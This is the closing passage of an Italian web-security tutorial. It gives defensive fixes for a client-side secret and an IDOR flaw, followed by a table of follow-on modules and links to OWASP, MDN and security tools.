- Fix: la chiamata passa dal backend; il prefisso pubblico è una dichiarazione, non una protezione

**Un utente vede i dati di un altro**
- Causa: controllo di proprietà mancante (IDOR)
- Fix: il filtro sul proprietario nella query, risposta 404, e il test riusabile su ogni risorsa

---

## Prossimi passi

| Modulo | Collegamento con questo tutorial |
|---|---|
| `tutorial_15_testing_web.md` | Rendere ogni correzione un test che fallisce prima e passa dopo |
| `tutorial_16_build_tools_deploy.md` | Gli header, i segreti e la firma degli artefatti nella pipeline |
| `tutorial_18_pwa_tecnologie_avanzate.md` | Il service worker: potere e superficie di attacco |
| `tutorial_22_rate_limiting_edge.md` | Difendersi dall'abuso e dal traffico automatico |
| `tutorial_23_websocket_security.md` | Origine, autenticazione e limiti su una connessione persistente |
| `tutorial_24_graphql.md` | Profondità delle query, analisi di costo e persisted query |

---

## Risorse di riferimento

**Riferimenti primari:** [OWASP Top 10 2021](https://owasp.org/Top10/) · [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) — *XSS Prevention*, *SQL Injection Prevention*, *Content Security Policy*, *File Upload*, *SSRF Prevention* · [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/) come lista di verifica strutturata

**Specifiche e documentazione:** [MDN — Web security](https://developer.mozilla.org/docs/Web/Security) · [CSP Level 3](https://www.w3.org/TR/CSP3/) · [Trusted Types](https://w3c.github.io/trusted-types/dist/spec/) · [Fetch Metadata](https://w3c.github.io/webappsec-fetch-metadata/) · [RFC 9116 — security.txt](https://www.rfc-editor.org/rfc/rfc9116.html)

**Strumenti:** [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/) · [securityheaders.com](https://securityheaders.com/) · [OWASP ZAP](https://www.zaproxy.org/) · [gitleaks](https://github.com/gitleaks/gitleaks) · [Semgrep](https://semgrep.dev/) per le regole statiche · [DOMPurify](https://github.com/cure53/DOMPurify)

---

> **Fine del Tutorial 14 — Sicurezza Web**
>
> Prossimo tutorial: `tutorial_15_testing_web.md`
